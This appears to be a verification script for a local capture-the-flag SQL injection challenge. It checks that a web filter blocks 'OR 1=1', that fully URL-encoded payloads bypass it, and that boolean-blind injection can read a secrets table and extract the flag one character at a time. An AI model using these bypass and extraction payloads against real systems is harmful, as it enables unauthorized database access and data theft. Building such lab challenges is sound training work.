#!/usr/bin/env python3
"""
Quick verification script to test if the CTF service works correctly
"""

import urllib.parse

import requests

BASE_URL = "http://localhost:5050"


def url_encode_full(text):
    """URL encode every character"""
    return "".join([f"%{ord(c):02x}" for c in text])


print("=" * 60)
print("CTF SQL Injection Service - Quick Verification")
print("=" * 60)

# Test 1: Health check
print("\n[1/6] Testing health endpoint...")
try:
    r = requests.get(f"{BASE_URL}/health", timeout=5)
    if r.status_code == 200 and r.text == "OK":
        print("✓ Health check OK")
    else:
        print("✗ Health check failed")
        exit(1)
except Exception as e:
    print(f"✗ Cannot connect: {e}")
    exit(1)

# Test 2: Normal search
print("\n[2/6] Testing normal search (id=1)...")
r = requests.get(f"{BASE_URL}/search?id=1")
if "User Found" in r.text:
    print("✓ Normal search works")
else:
    print("✗ Normal search failed")
    exit(1)

# Test 3: WAF blocks simple injection
print("\n[3/6] Testing WAF blocks OR injection...")
r = requests.get(f"{BASE_URL}/search?id=1 OR 1=1")
if "Malicious input detected" in r.text:
    print("✓ WAF blocks OR keyword")
else:
    print("✗ WAF should block OR keyword")
    exit(1)

# Test 4: URL encoded bypass
print("\n[4/6] Testing URL encoding bypass...")
# "1 AND 1=1" fully encoded
payload = url_encode_full("1 AND 1=1")
r = requests.get(f"{BASE_URL}/search?id={payload}")
if "User Found" in r.text:
    print("✓ URL encoding bypasses WAF")
else:
    print("✗ URL encoding bypass failed")
    print(f"Response: {r.text[:200]}")
    exit(1)

# Test 5: Access secrets table
print("\n[5/6] Testing secrets table access...")
# "1 AND (select 1 from secrets)=1"
payload = url_encode_full("1 AND (select 1 from secrets)=1")
r = requests.get(f"{BASE_URL}/search?id={payload}")
if "User Found" in r.text:
    print("✓ Secrets table accessible")
else:
    print("✗ Cannot access secrets table")
    exit(1)

# Test 6: Extract first character
print("\n[6/6] Testing flag extraction (first char)...")
# "1 AND (select 1 from secrets where substr(secret_value,1,1)='c')=1"
payload = url_encode_full(
    "1 AND (select 1 from secrets where substr(secret_value,1,1)='c')=1"
)
r = requests.get(f"{BASE_URL}/search?id={payload}")
if "User Found" in r.text:
    print("✓ First character is 'c' (flag starts with 'centralctf')")
else:
    print("✗ Character extraction failed")
    exit(1)

print("\n" + "=" * 60)
print("✓ ALL TESTS PASSED!")
print("=" * 60)
print("\nService is working correctly!")
print("You can now run: python3 exploit.py")
